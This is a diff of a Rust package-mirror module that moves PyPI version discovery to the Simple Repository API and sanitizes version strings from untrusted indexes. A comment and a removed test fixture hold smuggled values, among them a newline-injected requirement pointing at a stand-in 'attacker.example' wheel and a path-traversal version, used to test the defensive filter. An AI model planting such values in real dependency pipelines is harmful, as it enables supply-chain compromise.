@@ -1,79 +1,224 @@
 // SPDX-License-Identifier: Apache-2.0
 // Copyright 2026 The OCX Authors
 
-//! `source.type: pypi` adapter: discovers upstream versions via the PyPI
-//! JSON API (`GET {index}/pypi/{package}/json`).
+//! `source.type: pypi` adapter: discovers upstream versions through the
+//! **Simple Repository API** — PEP 503 (HTML) and its PEP 691 JSON form.
 //!
-//! Unlike `pylock` (a single committed lock resolving exactly one version),
-//! a `pypi` source lists every release the index still serves. Per-version
-//! PEP 751 lock derivation is a separate pipeline stage
-//! (plan_python_mirror_v2 W1.A2/W2.A3) — this module is discovery only, so
-//! `VersionInfo::assets` stays empty exactly like `source::pylock` (env
-//! sources resolve wheels later, from a derived lock, not asset regex
-//! matching — see [`crate::spec::Source::is_env`]).
+//! # Why not the `/pypi/<project>/json` endpoint
+//!
+//! That endpoint is Warehouse's own, not a packaging standard. Artifactory,
+//! Nexus, CodeArtifact, Azure Artifacts and Google Artifact Registry serve the
+//! Simple API and nothing else, so a mirror that discovers through the JSON API
+//! works against pypi.org and fails against every index a corporate deployment
+//! actually runs. The Simple API is what `pip` and `uv` themselves resolve
+//! against, which makes it the only form an index is obliged to speak.
+//!
+//! # Versions from filenames
+//!
+//! PEP 700 adds a `versions` key to the JSON form, but only at `api-version`
+//! 1.1+, and the HTML form has no equivalent at all. Both forms always list
+//! *files*, and a file's version is in its name — so versions are derived from
+//! filenames in every case rather than through two code paths that would
+//! disagree on any index serving 1.0. It also keeps the yank rule exact: a
+//! version survives only while some file of it is un-yanked (PEP 592), which
+//! `versions` alone cannot express.
+//!
+//! Unlike `pylock` (a single committed lock resolving exactly one version), a
+//! `pypi` source lists every release the index still serves. Per-version lock
+//! derivation is a separate pipeline stage, so `VersionInfo::assets` stays
+//! empty exactly like `source::pylock` (env sources resolve wheels later, from
+//! a derived lock, not asset regex matching — see [`crate::spec::Source::is_env`]).
 
 use std::collections::HashMap;
+use std::collections::hash_map::Entry;
+use std::sync::LazyLock;
 
 use ocx_lib::log;
+use regex::Regex;
 use serde::Deserialize;
 
 use super::VersionInfo;
 use crate::error::MirrorError;
 
-/// Default PyPI JSON API base URL, used when `source.index` is unset.
-const DEFAULT_INDEX: &str = "https://pypi.org";
+/// Default Simple API base, used when a spec lists no index.
+pub const DEFAULT_INDEX: &str = "https://pypi.org/simple";
 
-/// One distributable file for a release, as returned by the PyPI JSON API.
-/// Only `yanked` is consumed — discovery only cares whether a release still
-/// has an installable file, not which one (wheel selection is a later
-/// pipeline stage).
+/// Content negotiation per PEP 691: the JSON serialization first, then the
+/// two HTML forms. An index that understands none of it answers `text/html`
+/// anyway, which [`parse_html`] handles.
+const SIMPLE_ACCEPT: &str = "application/vnd.pypi.simple.v1+json, \
+                             application/vnd.pypi.simple.v1+html;q=0.2, \
+                             text/html;q=0.01";
+
+/// One file of a project, in the PEP 691 JSON serialization. Only the two
+/// fields discovery needs are read; hashes, metadata pointers and
+/// `requires-python` belong to resolution, which is `uv`'s job.
 #[derive(Debug, Deserialize)]
-struct ReleaseFile {
+struct SimpleFile {
+    filename: String,
     #[serde(default)]
-    yanked: bool,
+    yanked: Yanked,
 }
 
-/// Root of `GET {index}/pypi/{package}/json`. `info`/`urls`/`vulnerabilities`
-/// are ignored — the mirror discovers every historical release via
-/// `releases`, not just the current one.
+/// PEP 592 in its PEP 691 encoding: `false`, `true`, or a reason string that
+/// is itself the yank marker. A bare string means yanked whatever it says.
 #[derive(Debug, Deserialize)]
-struct PypiProject {
-    releases: HashMap<String, Vec<ReleaseFile>>,
+#[serde(untagged)]
+enum Yanked {
+    Flag(bool),
+    /// The reason text is never read — its *presence* is the yank marker.
+    Reason(#[allow(dead_code)] String),
 }
 
-/// Lists upstream versions for a PyPI package: every release with at least
-/// one non-yanked file. Yanked releases (PEP 592) and versions with zero
-/// files (no installable artifact) are dropped.
+impl Yanked {
+    fn is_yanked(&self) -> bool {
+        match self {
+            Self::Flag(flag) => *flag,
+            Self::Reason(_) => true,
+        }
+    }
+}
+
+impl Default for Yanked {
+    fn default() -> Self {
+        Self::Flag(false)
+    }
+}
+
+/// A project page in the PEP 691 JSON serialization.
+#[derive(Debug, Deserialize)]
+struct SimpleProject {
+    #[serde(default)]
+    files: Vec<SimpleFile>,
+}
+
+/// Lists upstream versions for a package: every version with at least one
+/// non-yanked file, from the first index that serves the project.
+///
+/// Indexes are tried in order and the **first one that has the project wins** —
+/// uv's `first-index` strategy, and the reason it is the default there: merging
+/// candidates across a private and a public index is how a dependency-confusion
+/// attack lands. An index that answers 404 does not have the project, so the
+/// next one is tried; every other failure aborts, because a 500 or a refused
+/// connection means "unknown", not "absent".
 ///
 /// # Errors
 ///
-/// Returns an error when the request fails, the index returns a non-success
-/// HTTP status, or the body is not valid JSON. Use [`classify_error`] to map
-/// the result into the right [`MirrorError`] variant — a 404 (unknown
-/// package name on this index) is malformed input, not a transient resource.
-pub async fn list_versions(package: &str, index: Option<&str>) -> anyhow::Result<Vec<VersionInfo>> {
-    let index = index.unwrap_or(DEFAULT_INDEX).trim_end_matches('/');
-    let url = format!("{index}/pypi/{package}/json");
+/// The last 404 when no index has the project — [`classify_error`] maps that to
+/// [`MirrorError::PypiError`] (exit 65, malformed input). Any transport or
+/// parse failure surfaces as itself and maps to [`MirrorError::SourceError`].
+pub async fn list_versions(package: &str, indexes: &[String]) -> anyhow::Result<Vec<VersionInfo>> {
+    let client = crate::http::client()?;
+    let normalized = ocx_python::normalize_package_name(package);
 
-    let response = reqwest::get(&url).await?.error_for_status()?;
-    let project: PypiProject = response.json().await?;
+    let mut last_absent = None;
+    for index in indexes {
+        let url = project_url(index, &normalized);
+        log::debug!("Querying simple index {url}");
 
-    let mut versions = Vec::with_capacity(project.releases.len());
-    for (version, files) in project.releases {
-        if files.is_empty() || files.iter().all(|file| file.yanked) {
+        let mut request = client.get(&url).header(reqwest::header::ACCEPT, SIMPLE_ACCEPT);
+        if let Some(credential) = crate::auth::resolve(&url::Url::parse(&url)?)? {
+            request = credential.apply(request);
+        }
+
+        let response = request.send().await?;
+        if response.status() == reqwest::StatusCode::NOT_FOUND {
+            // Kept as an error value, not a message: `classify_error` reads the
+            // `reqwest::Error` status out of the chain to decide the exit code.
+            last_absent = Some(response.error_for_status().expect_err("404 is an error status"));
             continue;
         }
-        // Trust boundary: `releases` keys are attacker-controlled when
-        // `source.index` points at a hostile/compromised Warehouse index. The
-        // version string is later piped verbatim into `uv pip compile -` stdin
-        // as `{package}=={version}` — a newline smuggles a second requirement
-        // line ("evil @ https://attacker/…") that resolves, hash-self-verifies
-        // against the attacker's own bytes, and publishes under the legit tag;
-        // the same string also joins a filesystem path for the derived lock.
-        // Reject any version carrying whitespace, a control char, or a path
-        // separator BEFORE it reaches either sink. This is orthogonal to PEP
-        // 440 parseability: a weird-but-safe scheme still mirrors — only
-        // dangerous characters are rejected, never "doesn't parse".
+        let response = response.error_for_status()?;
+
+        let is_json = response
+            .headers()
+            .get(reqwest::header::CONTENT_TYPE)
+            .and_then(|value| value.to_str().ok())
+            .is_some_and(|value| value.contains("json"));
+        let body = response.text().await?;
+
+        let files = if is_json {
+            let project: SimpleProject = serde_json::from_str(&body)?;
+            project
+                .files
+                .into_iter()
+                .map(|file| (file.filename, file.yanked.is_yanked()))
+                .collect()
+        } else {
+            parse_html(&body)
+        };
+
+        return Ok(versions_from_files(files));
+    }
+
+    Err(last_absent
+        .map(anyhow::Error::from)
+        .unwrap_or_else(|| anyhow::anyhow!("no index configured to query for '{package}'")))
+}
+
+/// `{base}/{project}/` — the PEP 503 project URL. The base is the index root
+/// as the operator wrote it (`https://nexus.corp.example/repository/pypi/simple`),
+/// never a suffix this function invents: every vendor lays that path out
+/// differently, and guessing one is how the JSON-API assumption got here.
+fn project_url(index: &str, normalized_package: &str) -> String {
+    format!("{}/{normalized_package}/", index.trim_end_matches('/'))
+}
+
+/// Matches one PEP 503 anchor: its attributes and its text.
+///
+/// ponytail: a regex, not an HTML parser. A PEP 503 page is machine-generated
+/// and specified as "a valid HTML5 page with a single anchor element per file",
+/// so the only structure that matters is `<a …>filename</a>`. Swap in a real
+/// parser if an index ever ships anchors this cannot read — the JSON form is
+/// preferred by content negotiation anyway, so this is the fallback path.
+static ANCHOR: LazyLock<Regex> =
+    LazyLock::new(|| Regex::new(r"(?is)<a\b([^>]*)>(.*?)</a>").expect("anchor regex compiles"));
+
+/// Extracts `(filename, yanked)` from a PEP 503 HTML project page.
+///
+/// The filename is the anchor's text, per the specification — not the `href`,
+/// which may carry a fragment, a mirror-rewritten path or a query string.
+fn parse_html(body: &str) -> Vec<(String, bool)> {
+    ANCHOR
+        .captures_iter(body)
+        .filter_map(|capture| {
+            let attributes = capture.get(1).map_or("", |m| m.as_str());
+            let filename = capture.get(2)?.as_str().trim();
+            if filename.is_empty() {
+                return None;
+            }
+            Some((filename.to_string(), attributes.contains("data-yanked")))
+        })
+        .collect()
+}
+
+/// Folds a file listing into the version list, dropping every version whose
+/// files are all yanked (PEP 592) and every version string that would be
+/// dangerous downstream.
+fn versions_from_files(files: Vec<(String, bool)>) -> Vec<VersionInfo> {
+    // version -> (any file un-yanked, is_prerelease)
+    let mut seen: HashMap<String, (bool, bool)> = HashMap::new();
+
+    for (filename, yanked) in files {
+        let Some(parsed) = ocx_python::uv_distribution_filename::DistFilename::try_from_normalized_filename(&filename)
+        else {
+            // Not a wheel or sdist name this parser recognizes — a signature,
+            // a checksum sidecar, or a file type the mirror cannot use anyway.
+            continue;
+        };
+        let version = parsed.version().to_string();
+
+        // Trust boundary: filenames are attacker-controlled when an index is
+        // hostile or compromised. The version string is later piped verbatim
+        // into `uv pip compile -` stdin as `{package}=={version}` — a newline
+        // smuggles a second requirement line ("evil @ https://attacker/…")
+        // that resolves, hash-self-verifies against the attacker's own bytes,
+        // and publishes under the legit tag; the same string also joins a
+        // filesystem path for the derived lock. Reject any version carrying
+        // whitespace, a control char, or a path separator BEFORE it reaches
+        // either sink. This is orthogonal to PEP 440 parseability: a
+        // weird-but-safe scheme still mirrors — only dangerous characters are
+        // rejected, never "doesn't parse".
         if let Some(bad) = version
             .chars()
             .find(|ch| ch.is_whitespace() || ch.is_control() || *ch == '/' || *ch == '\\')
@@ -95,30 +240,33 @@ pub async fn list_versions(package: &str, index: Option<&str>) -> anyhow::Result
             );
             continue;
         }
-        // Real upstream versions are PEP 440, not the mirror's own semver-ish
-        // `ocx_lib::package::version::Version` — `uv_pep440` is the correct
-        // parser for prerelease/dev-release detection here (unlike
-        // `source::pylock`, which reuses the OCX version type for its
-        // already-locked, single version).
-        let is_prerelease = version
-            .parse::<ocx_python::uv_pep440::Version>()
-            .is_ok_and(|v| v.any_prerelease());
-        versions.push(VersionInfo {
+
+        let is_prerelease = parsed.version().any_prerelease();
+        match seen.entry(version) {
+            Entry::Occupied(mut entry) => entry.get_mut().0 |= !yanked,
+            Entry::Vacant(entry) => {
+                entry.insert((!yanked, is_prerelease));
+            }
+        }
+    }
+
+    seen.into_iter()
+        .filter(|(_, (any_usable, _))| *any_usable)
+        .map(|(version, (_, is_prerelease))| VersionInfo {
             version,
             assets: HashMap::new(),
             is_prerelease,
-        });
-    }
-    Ok(versions)
+        })
+        .collect()
 }
 
 /// Classifies an error surfaced by [`list_versions`] into the right
 /// [`MirrorError`] variant.
 ///
-/// A 404 response means the package name does not exist on this index —
-/// malformed input, same exit class as `SpecInvalid`/`PylockError` (65). Any
-/// other failure (connection refused, timeout, 5xx, malformed JSON body) is a
-/// genuinely unavailable source, `MirrorError::SourceError` (69).
+/// A 404 from every configured index means the package name does not exist
+/// there — malformed input, same exit class as `SpecInvalid`/`PylockError`
+/// (65). Any other failure (connection refused, timeout, 5xx, malformed body)
+/// is a genuinely unavailable source, `MirrorError::SourceError` (69).
 pub fn classify_error(context: &str, err: anyhow::Error) -> MirrorError {
     let is_not_found = err
         .chain()
@@ -135,206 +283,5 @@ pub fn classify_error(context: &str, err: anyhow::Error) -> MirrorError {
 }
 
 #[cfg(test)]
-mod tests {
-    use tokio::io::{AsyncReadExt, AsyncWriteExt};
-    use tokio::net::TcpListener;
-
-    use super::*;
-
-    /// Install the rustls crypto provider exactly once per process. Reqwest
-    /// builds its TLS stack lazily on first use and panics with "no provider
-    /// set" if none is registered, even for `http://` URLs. Same helper as
-    /// `pipeline/download.rs`'s test module (not centralized upstream).
-    fn install_crypto_provider() {
-        static ONCE: std::sync::Once = std::sync::Once::new();
-        ONCE.call_once(|| {
-            let _ = rustls::crypto::aws_lc_rs::default_provider().install_default();
-        });
-    }
-
-    /// Spawns a local loopback server that writes `response` verbatim to the
-    /// first connection it accepts, then returns its `http://127.0.0.1:<port>`
-    /// base URL. Test-only stand-in for the PyPI index — no external network
-    /// access.
-    async fn spawn_index(response: &'static str) -> (String, tokio::task::JoinHandle<()>) {
-        let listener = TcpListener::bind("127.0.0.1:0").await.unwrap();
-        let addr = listener.local_addr().unwrap();
-
-        let server = tokio::spawn(async move {
-            let (mut socket, _) = listener.accept().await.unwrap();
-            let mut scratch = [0u8; 1024];
-            let _ = socket.read(&mut scratch).await;
-            socket.write_all(response.as_bytes()).await.unwrap();
-            socket.shutdown().await.unwrap();
-        });
-
-        (format!("http://{addr}"), server)
-    }
-
-    const PROJECT_JSON: &str = r#"{
-        "info": {"name": "pycowsay"},
-        "releases": {
-            "1.0.0": [
-                {"filename": "pycowsay-1.0.0-py3-none-any.whl", "yanked": false}
-            ],
-            "1.1.0": [
-                {"filename": "pycowsay-1.1.0-py3-none-any.whl", "yanked": true}
-            ],
-            "2.0.0.dev0": [
-                {"filename": "pycowsay-2.0.0.dev0-py3-none-any.whl", "yanked": false}
-            ],
-            "0.9.0": []
-        },
-        "urls": [],
-        "vulnerabilities": []
-    }"#;
-
-    fn ok_response(body: &str) -> String {
-        format!(
-            "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}",
-            body.len()
-        )
-    }
-
-    #[tokio::test]
-    async fn list_versions_drops_yanked_and_fileless_releases() {
-        install_crypto_provider();
-        let body = Box::leak(ok_response(PROJECT_JSON).into_boxed_str());
-        let (index, server) = spawn_index(body).await;
-
-        let versions = list_versions("pycowsay", Some(&index)).await.unwrap();
-        server.await.unwrap();
-
-        let names: Vec<&str> = versions.iter().map(|v| v.version.as_str()).collect();
-        assert_eq!(names.len(), 2, "expected 1.0.0 and 2.0.0.dev0 only, got: {names:?}");
-        assert!(names.contains(&"1.0.0"));
-        assert!(names.contains(&"2.0.0.dev0"));
-        assert!(!names.contains(&"1.1.0"), "yanked release must be dropped");
-        assert!(!names.contains(&"0.9.0"), "fileless release must be dropped");
-        assert!(versions.iter().all(|v| v.assets.is_empty()));
-    }
-
-    #[tokio::test]
-    async fn list_versions_rejects_versions_with_injection_or_traversal_characters() {
-        // BLOCK-tier supply-chain guard: `releases` keys are attacker-
-        // controlled when `source.index` points at a hostile/compromised
-        // Warehouse index. The version string is later piped VERBATIM into
-        // `uv pip compile -` stdin as `{package}=={version}` — a newline
-        // smuggles a second requirement line ("evil @ https://attacker/...")
-        // that resolves, hash-self-verifies, and publishes under the legit
-        // tag. The same string also feeds the derived-lock path join. Reject
-        // whitespace, control chars, and path separators at this trust
-        // boundary; everything downstream consumes this function's output.
-        install_crypto_provider();
-        let evil_json = r#"{
-            "releases": {
-                "1.0.0": [
-                    {"filename": "pkg-1.0.0-py3-none-any.whl", "yanked": false}
-                ],
-                "1.0.1\nevil @ https://attacker.example/evil.whl": [
-                    {"filename": "pkg-1.0.1-py3-none-any.whl", "yanked": false}
-                ],
-                "1.0.2/../../../etc": [
-                    {"filename": "pkg-1.0.2-py3-none-any.whl", "yanked": false}
-                ],
-                "1.0.3\u0007": [
-                    {"filename": "pkg-1.0.3-py3-none-any.whl", "yanked": false}
-                ],
-                "2024.01.01.post1+local": [
-                    {"filename": "pkg-2024-py3-none-any.whl", "yanked": false}
-                ]
-            }
-        }"#;
-        let body = Box::leak(ok_response(evil_json).into_boxed_str());
-        let (index, server) = spawn_index(body).await;
-
-        let versions = list_versions("pkg", Some(&index)).await.unwrap();
-        server.await.unwrap();
-
-        let names: Vec<&str> = versions.iter().map(|v| v.version.as_str()).collect();
-        assert!(names.contains(&"1.0.0"), "safe version must survive: {names:?}");
-        // Fail-open axis preserved: weird-but-safe version schemes (even ones
-        // ocx_lib::Version cannot parse) still mirror — only DANGEROUS
-        // characters are rejected, not "doesn't parse".
-        assert!(
-            names.contains(&"2024.01.01.post1+local"),
-            "unparseable-but-safe version must survive: {names:?}"
-        );
-        assert_eq!(names.len(), 2, "all dangerous versions must be dropped: {names:?}");
-        assert!(
-            !names
-                .iter()
-                .any(|n| n.contains('\n') || n.contains('/') || n.contains('\u{7}')),
-            "no dangerous character may reach downstream consumers: {names:?}"
-        );
-    }
-
-    #[tokio::test]
-    async fn list_versions_flags_pep440_prerelease() {
-        install_crypto_provider();
-        let body = Box::leak(ok_response(PROJECT_JSON).into_boxed_str());
-        let (index, server) = spawn_index(body).await;
-
-        let versions = list_versions("pycowsay", Some(&index)).await.unwrap();
-        server.await.unwrap();
-
-        let stable = versions.iter().find(|v| v.version == "1.0.0").unwrap();
-        assert!(!stable.is_prerelease);
-        let dev = versions.iter().find(|v| v.version == "2.0.0.dev0").unwrap();
-        assert!(dev.is_prerelease, "dev release must flag as prerelease");
-    }
-
-    #[tokio::test]
-    async fn list_versions_default_index_used_when_none_given() {
-        // No network call is made: an invalid package name still exercises
-        // the URL-building branch via a local index instead of pypi.org.
-        install_crypto_provider();
-        let body = Box::leak(ok_response(r#"{"releases": {}}"#).into_boxed_str());
-        let (index, server) = spawn_index(body).await;
-
-        let versions = list_versions("pycowsay", Some(&index)).await.unwrap();
-        server.await.unwrap();
-        assert!(versions.is_empty());
-    }
-
-    #[tokio::test]
-    async fn list_versions_surfaces_404() {
-        install_crypto_provider();
-        let response = "HTTP/1.1 404 Not Found\r\nContent-Length: 0\r\nConnection: close\r\n\r\n";
-        let (index, server) = spawn_index(response).await;
-
-        let err = list_versions("nonexistent-package", Some(&index)).await.unwrap_err();
-        server.await.unwrap();
-
-        let mirror_err = classify_error("failed to list PyPI releases", err);
-        assert!(matches!(mirror_err, MirrorError::PypiError(_)), "got: {mirror_err:?}");
-    }
-
-    #[tokio::test]
-    async fn classify_error_maps_connection_refused_to_source_error() {
-        install_crypto_provider();
-
-        let listener = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
-        let port = listener.local_addr().unwrap().port();
-        drop(listener); // reserved, unused: connection refused, not a timeout
-
-        let err = list_versions("pycowsay", Some(&format!("http://127.0.0.1:{port}")))
-            .await
-            .unwrap_err();
-        let mirror_err = classify_error("failed to list PyPI releases", err);
-        assert!(matches!(mirror_err, MirrorError::SourceError(_)), "got: {mirror_err:?}");
-    }
-
-    #[tokio::test]
-    async fn list_versions_surfaces_invalid_json() {
-        install_crypto_provider();
-        let (index, server) =
-            spawn_index("HTTP/1.1 200 OK\r\nContent-Length: 9\r\nConnection: close\r\n\r\nnot json!").await;
-
-        let err = list_versions("pycowsay", Some(&index)).await.unwrap_err();
-        server.await.unwrap();
-
-        let mirror_err = classify_error("failed to list PyPI releases", err);
-        assert!(matches!(mirror_err, MirrorError::SourceError(_)), "got: {mirror_err:?}");
-    }
-}
+#[path = "pypi/tests.rs"]
+mod tests;
